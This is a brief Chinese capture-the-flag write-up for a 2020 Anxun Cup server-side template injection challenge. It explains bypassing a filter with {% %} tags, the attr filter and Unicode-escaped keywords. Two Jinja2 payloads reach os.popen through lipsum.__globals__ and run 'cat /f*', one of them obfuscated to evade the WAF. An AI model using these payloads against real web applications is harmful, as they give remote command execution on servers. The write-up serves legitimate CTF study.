# [安洵杯 2020]Normal SSTI Unicode编码绕过waf

这道题已经是很明显的ssti了

然后过滤了 {{}}

我们使用{%%}

然后过滤了许多关键词 但是我们可以使用Unicode编码绕过 配合上 attr

```clojure
{%print(lipsum|attr("__globals__")|attr("__getitem__")("os")|attr(popen)("cat /f*")|attr("read")())%}
```

然后我们需要把特殊替换 命令替换

```clojure
{%print(lipsum|attr("\u005f\u005f\u0067\u006c\u006f\u0062\u0061\u006c\u0073\u005f\u005f")|attr("\u005f\u005f\u0067\u0065\u0074\u0069\u0074\u0065\u006d\u005f\u005f")("\u006f\u0073")|attr("\u0070\u006f\u0070\u0065\u006e")("\u0063\u0061\u0074\u0020\u002f\u0066\u002a")|attr("read")())%}
```

即可

或者fenjing一把梭哈即可